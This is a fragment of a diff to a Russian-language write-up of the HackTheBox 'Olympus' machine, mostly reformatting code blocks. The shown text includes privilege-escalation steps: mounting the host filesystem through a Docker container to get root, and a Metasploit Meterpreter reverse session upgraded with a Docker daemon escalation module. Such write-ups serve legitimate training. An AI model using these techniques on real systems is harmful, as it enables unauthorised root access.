@@ -327,10 +327,14 @@ drwxr-xr-x 1 zeus zeus   4096 Apr  8 17:31 .
 drwxr-xr-x 1 zeus zeus   4096 Apr  8 10:56 ..
 -rw-r--r-- 1 zeus zeus 297917 Apr  8 12:48 captured.cap
 -rw-r--r-- 1 zeus zeus     57 Apr  8 17:30 papyrus.txt
+```
 
+```text
 $ cat papyrus.txt
 Captured while flying. I'll banish him to Olympia - Zeus
+```
 
+```text
 $ file captured.cap
 captured.cap: tcpdump capture file (little-endian) - version 2.4 (802.11, capture length 65535)
 ```
@@ -416,7 +420,9 @@ drwxr-xr-x 1 root   root   4096 Apr  8 11:59 ..
 drwx------ 2 icarus icarus 4096 Apr 15 16:44 .cache
 -rw-r--r-- 1 icarus icarus  655 May 16  2017 .profile
 -rw-r--r-- 1 root   root     85 Apr 15 21:50 help_of_the_gods.txt
+```
 
+```text
 icarus@620b296204a3:~$ cat help_of_the_gods.txt
 
 Athena goddess will guide you through the dark...
@@ -632,7 +638,6 @@ ce2ecb56a96e        rodhes              "/etc/bind/entrypoin…"   5 months ago 
 620b296204a3        olympia             "/usr/sbin/sshd -D"      5 months ago        Up 16 minutes       0.0.0.0:2222->22/tcp                     olympia
 ```
 
-### root.txt
 Вклинимся в файловую систему скажем контейнера `olympia`, примонтировав root-директорию хоста, призовем шелл и прочитаем root-флаг:
 ```text
 prometheus@olympus:~$ docker run --rm -i -t -v /:/hostOS olympia /bin/bash
@@ -641,7 +646,10 @@ root
 
 root@89763840b853:/# id
 uid=0(root) gid=0(root) groups=0(root)
+```
 
+### root.txt
+```text
 root@89763840b853:/# cat /hostOS/root/root.txt
 aba48699????????????????????????
 ```
@@ -707,7 +715,6 @@ msf exploit(multi/handler) > run
 [*] Meterpreter session 1 opened (10.10.14.14:4444 -> 10.10.10.83:48154) at 2018-08-26 11:02:13 -0400
 ```
 
-### root.txt
 Дальше как по нотам: уходим в фон, выбираем нужную нагрузку (`docker_daemon_privilege_escalation`) для апгрейда сессии и получаем права суперпользователя:
 ```text
 meterpreter > CTRL-Z
